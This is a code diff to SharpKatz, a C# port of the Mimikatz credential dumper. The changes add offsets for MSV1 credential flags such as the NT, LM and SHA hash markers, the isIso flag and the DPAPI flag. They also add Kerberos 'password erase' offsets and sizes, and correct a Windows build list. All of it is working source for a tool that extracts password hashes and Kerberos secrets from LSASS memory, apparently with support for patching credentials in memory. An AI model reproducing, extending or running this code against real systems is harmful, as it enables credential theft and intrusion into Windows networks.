@@ -8,6 +8,8 @@ using SharpKatz.WinBuild;
 using System;
 using System.Linq;
 using System.Reflection;
+using System.Runtime.InteropServices;
+using static SharpKatz.Module.Kerberos;
 using static SharpKatz.Module.Msv1;
 using static SharpKatz.Win32.Natives;
 
@@ -50,6 +52,11 @@ namespace SharpKatz
         public int NtOwfPasswordOffset { get; set; }
         public int ShaOwPasswordOffset { get; set; }
         public int DPAPIProtectedOffset { get; set; }
+        public int IsNtOwfPasswordOffset { get; set; }
+        public int IsLmOwfPasswordOffset { get; set; }
+        public int IsShaOwPasswordOffset { get; set; }
+        public int IsIsoOffset { get; set; }
+        public int IsDPAPIProtectedOffset { get; set; }
 
         public int LOGONSESSIONLISTOFFSET { get; set; }
         public int LOGONSESSIONSLISTCOUNTOFFSET { get; set; }
@@ -88,6 +95,8 @@ namespace SharpKatz
         public Type KerberosHashType { get; set; }
         public int KerberosLogonSessionKeyListOffset { get; set; }
         public int KerberosHashGenericOffset { get; set; }
+        public int KerberosOffsetPasswordErase { get; set; }
+        public int KerberosPasswordEraseSize { get; set; }
 
         //Tspkg
         public byte[] TSGlobalCredTableSign { get; set; }
@@ -112,7 +121,7 @@ namespace SharpKatz
             new WinBuild1607(),
             new WinBuild1703(),
             new WinBuild1803(),
-            new WinBuild1803(),
+            new WinBuild1809(),
             new WinBuild1903(),
             new WinBuild2004()
         };
@@ -244,14 +253,22 @@ namespace SharpKatz
             LmOwfPasswordOffset = MSV1PrimaryCredentialFieldOffset("LmOwfPassword");
             NtOwfPasswordOffset = MSV1PrimaryCredentialFieldOffset("NtOwfPassword");
             ShaOwPasswordOffset = MSV1PrimaryCredentialFieldOffset("ShaOwPassword");
+
+            IsNtOwfPasswordOffset = MSV1PrimaryCredentialFieldOffset("isNtOwfPassword");
+            IsLmOwfPasswordOffset = MSV1PrimaryCredentialFieldOffset("isLmOwfPassword");
+            IsShaOwPasswordOffset = MSV1PrimaryCredentialFieldOffset("isShaOwPassword");
+            IsIsoOffset = MSV1PrimaryCredentialFieldOffset("isIso");
             
+
             if (winbuild.PrimaryCredentialType != typeof(MSV1_0_PRIMARY_CREDENTIAL_10_1607))
             {
                 DPAPIProtectedOffset = 0;
+                IsDPAPIProtectedOffset = 0;
             }
             else
             {
                 DPAPIProtectedOffset = MSV1PrimaryCredentialFieldOffset("DPAPIProtected");
+                IsDPAPIProtectedOffset = MSV1PrimaryCredentialFieldOffset("isDPAPIProtected");
             }
 
             if (winbuild.PrimaryCredentialType == typeof(MSV1_0_PRIMARY_CREDENTIAL_10_1607))
@@ -278,6 +295,17 @@ namespace SharpKatz
         {
             KerberosSessionLocallyUniqueIdentifierOffset = KerberosSessionFieldOffset("LocallyUniqueIdentifier");
             KerberosSessionCredentialOffset = KerberosSessionFieldOffset("credentials");
+
+            if(winbuild.KerberosPrimaryCredentialType == typeof(KIWI_KERBEROS_10_PRIMARY_CREDENTIAL))
+            {
+                KerberosOffsetPasswordErase = KerberosSessionFieldOffset("credentials") + KerberosPrimaryCredentialFieldOffset("unk0");
+                KerberosPasswordEraseSize = winbuild.KerberosPrimaryCredentialTypeSize - KerberosPrimaryCredentialFieldOffset("unk0");
+            }
+            else
+            {
+                KerberosOffsetPasswordErase = KerberosSessionFieldOffset("credentials") + KerberosPrimaryCredentialFieldOffset("unkFunction");
+                KerberosPasswordEraseSize = winbuild.KerberosPrimaryCredentialTypeSize - KerberosPrimaryCredentialFieldOffset("unkFunction");
+            }
         }
 
         private int KerberosPrimaryCredentialFieldOffset(string field)
